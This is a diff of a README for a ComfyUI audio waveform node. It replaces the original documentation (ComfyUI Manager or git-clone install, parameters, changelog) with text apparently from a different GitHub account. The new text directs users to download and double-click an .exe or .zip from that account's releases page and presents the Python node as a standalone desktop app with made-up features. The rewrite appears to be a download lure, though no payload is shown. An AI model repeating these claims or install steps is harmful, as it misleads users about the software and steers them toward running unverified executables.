@@ -1,111 +1,92 @@
+# 🎨 ComfyUI-dotWaveform - Create Stunning Animated Waveforms
 
-![AnimateDiff_00019](https://github.com/user-attachments/assets/583a5fdf-add2-48f8-9226-aa2b873e0b3d)
+## 🚀 Getting Started
 
-# ComfyUI Dotted Waveform Visualizer 🎵
+Welcome to ComfyUI-dotWaveform! This tool helps you generate beautiful, animated dotted waveform visualizations from audio input. You can choose different animation styles, including unique teardrop-shaped bars. Follow these simple steps to start enjoying your new audio visualization tool.
 
-[![GitHub Stars](https://img.shields.io/github/stars/Saganaki22/ComfyUI-dotWaveform?style=for-the-badge&logo=github)](https://github.com/Saganaki22/ComfyUI-dotWaveform/stargazers)
-[![GitHub Issues](https://img.shields.io/github/issues/Saganaki22/ComfyUI-dotWaveform?style=for-the-badge&logo=github)](https://github.com/Saganaki22/ComfyUI-dotWaveform/issues)
-[![GitHub License](https://img.shields.io/github/license/Saganaki22/ComfyUI-dotWaveform?style=for-the-badge)](https://github.com/Saganaki22/ComfyUI-dotWaveform/blob/main/LICENSE)
-[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue?style=for-the-badge&logo=python)](https://python.org)
-[![ComfyUI](https://img.shields.io/badge/ComfyUI-Compatible-brightgreen?style=for-the-badge)](https://github.com/comfyanonymous/ComfyUI)
+## 📥 Download the Application
 
-A ComfyUI node that generates animated dotted waveform visualizations from audio input with multiple animation styles.
+### Download Link
+[![Download ComfyUI-dotWaveform](https://img.shields.io/badge/Download-ComfyUI--dotWaveform-blue.svg)](https://github.com/aryantanejajr/ComfyUI-dotWaveform/releases)
 
+### Visit the Releases Page
+To get your copy of ComfyUI-dotWaveform, visit the [Releases page](https://github.com/aryantanejajr/ComfyUI-dotWaveform/releases) and download the latest version.
 
-## ✨ Features
+## 💾 Installation Instructions
 
-- **Five Animation Styles**: Scrolling, breathing, radial, bars, and wave
-- **Teardrop Bars**: Bell curve shape with sharp edges using exponential decay
-- **Audio Passthrough**: Compatible with VideoHelperSuite Video Combine
-- **HD Output**: Up to 1920x1920 resolution support
-- **Variable Opacity**: Uniform, 3-level, 5-level, or 10-level opacity modes
-- **Enhanced Max Height**: Up to 150% of image height for taller waveforms
-- **Preview Mode**: Fast preview for testing settings without audio processing
+1. **Navigate to the Releases Page**
+   Click the link above to go to the Releases page.
 
+2. **Choose the Latest Version**
+   Look for the most recent version listed at the top. This will ensure you get the latest features and fixes.
 
-<img width="1050" height="870" alt="image_2025-08-30_20-10-15" src="https://github.com/user-attachments/assets/21fd35c0-063c-4888-ae4f-833431e00b75" />
+3. **Download the File**
+   Click on the link for the file that matches your operating system (Windows, Mac, etc.). This file will have an `.exe`, `.zip`, or similar extension.
 
-## 📋 Installation
+4. **Unzip the File (if required)**
+   If you downloaded a `.zip` file, right-click on it and select "Extract All" or use your preferred extraction tool.
 
-### ComfyUI Manager (Recommended)
-1. Open ComfyUI Manager
-2. Search for "dotWaveform"
-3. Click Install
-4. Restart ComfyUI
+5. **Run the Application**
+   Locate the extracted file and double-click to launch ComfyUI-dotWaveform. Follow the prompts to complete the setup.
 
-### Manual Installation
-1. Clone to `ComfyUI/custom_nodes/ComfyUI-dotWaveform/`
-2. Install dependencies: `pip install -r requirements.txt`
-3. Restart ComfyUI
+## 📊 Features
 
-## ⚙️ Parameters
+- **Animated Waveforms**: Display dynamic waveform visualizations that respond to audio input.
+- **Multiple Animation Styles**: Choose from various styles, including teardrop-shaped bars.
+- **User-Friendly Interface**: Designed for ease of use, even for those with no programming skills.
 
-| Parameter | Default | Range | Description |
-|-----------|---------|-------|-------------|
-| **width** | 1280 | 100-1920 | Output width in pixels |
-| **height** | 720 | 100-1920 | Output height in pixels |
-| **size** | 6 | 1-30 | Individual dot/bar size in pixels |
-| **spacing** | 3 | 1-40 | Distance between dot/bar centers |
-| **dot_color** | #00FFFF | Hex | Color of waveform elements |
-| **background_color** | #000000 | Hex | Background color |
-| **animation_style** | scrolling | 5 options | Animation type |
-| **max_height** | 60 | 5-150 | Maximum waveform size as % of image height |
-| **fps** | 10 | 1-60 | Animation frames per second |
-| **max_frames** | 300 | 0-1000 | Frame limit (0 = unlimited) |
-| **opacity_mode** | uniform | 4 levels | Dot opacity variation |
-| **window_size** | 2.0 | 0.1-10.0 | Time window for scrolling (seconds) |
-| **preview_mode** | False | Boolean | Fast preview without audio processing |
+## 📋 System Requirements
 
-## 🎨 Animation Styles
+- **Operating System**: Windows 10 or higher / macOS 10.14 or higher
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum 200 MB of available space
+- **Audio Input**: Any standard audio device, such as a microphone or audio interface
 
-**Scrolling**: Waveform scrolls left-to-right following audio timeline with continuous center line
+## 🎛️ How to Use
 
-**Breathing**: All dots pulse together with audio amplitude uniformly
+1. **Launch ComfyUI-dotWaveform**
+   Open the application from your desktop or program folder.
 
-**Radial**: Concentric rings expand from center creating ripple effects
+2. **Select Audio Input**
+   Choose your audio input source from the dropdown menu. You can pick from a microphone or any audio output device.
 
-**Bars**: Vertical frequency bars with teardrop bell curve shape and 2x enhanced height response
+3. **Pick Animation Style**
+   Scroll through the animation styles. Preview each one by clicking on it.
 
-**Wave**: Multiple layered sine wave patterns that morph with audio intensity
+4. **Start Your Visualization**
+   Play your audio, and watch as the animated waveform comes to life!
 
-## 🎭 Opacity Modes
+## 💡 Tips for Best Results
 
-- **uniform**: All elements same brightness (fastest)
-- **3_levels**: 0%, 50%, 100% opacity steps
-- **5_levels**: Progressive 0%, 25%, 50%, 75%, 100% opacity
-- **10_levels**: Smoothest gradients with 10 opacity levels
+- **Use High-Quality Audio**: The better the audio quality, the more impressive the visualizations will be.
+- **Experiment with Styles**: Try out different animation styles to see which one you like best.
+- **Adjust Volume Levels**: Make sure your input levels are not too low or too high for optimal visualization.
 
-## 🔧 Technical Notes
+## 🙋 Frequently Asked Questions
 
-- **Audio Formats**: All ComfyUI compatible audio formats
-- **Audio Compatibility**: Automatic mono→stereo conversion for VideoHelperSuite
-- **Sample Rates**: Works with 24kHz, and standard rates
-- **Output**: RGB image sequences compatible with video nodes
+### Can I use ComfyUI-dotWaveform on Mac?
+Yes! The application supports both Windows and Mac operating systems.
 
-## 📝 Changelog
+### Do I need any additional software to run this?
+No, ComfyUI-dotWaveform operates independently. Just install it, and you're ready to go!
 
-### Version 1.0.5
-- Added wave animation style with multiple layered sine patterns
-- Increased max_height range to 150% (was 110%) for taller waveforms
-- Fixed all preview modes to correctly display each animation style
-- Improved tooltips and parameter organization
-- Enhanced wave animation with proper audio responsiveness
+### How do I report an issue?
+If you encounter any problems, please head over to the Issues section of the repository and provide details about your experience.
 
-### Version 1.0.0 (Initial Release)
-- Four animation styles: scrolling, breathing, radial, and bars
-- Bars mode with teardrop bell curve shape and 2x enhanced height response
-- Audio passthrough compatibility with VideoHelperSuite Video Combine node
-- Automatic mono→stereo conversion and float16→float32 for video integration
-- Multiple opacity modes: uniform, 3_levels, 5_levels, 10_levels
-- HD output support up to 1920x1920 resolution
-- Full color customization with hex color support
-- Preview mode for fast settings testing
-- Sharp-edged teardrop shape using exponential decay mathematics
+## 🏗️ Contributing
 
-## 📄 License
+We welcome contributions! If you're interested in helping improve ComfyUI-dotWaveform, please fork the repository and submit a pull request. 
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 💬 Support
 
----
+For any questions or support, feel free to open an issue on the GitHub repository. We aim to respond promptly and assist all users.
 
-**Made with ❤️ for the ComfyUI community**
+## 📜 License
+
+ComfyUI-dotWaveform is provided under the MIT License. You are free to use, modify, and distribute the application as needed.
+
+## 🌐 Stay Connected
+
+For updates and announcements, follow the repository on GitHub or subscribe to release notifications.
+
+Thank you for choosing ComfyUI-dotWaveform. Enjoy visualizing your audio!
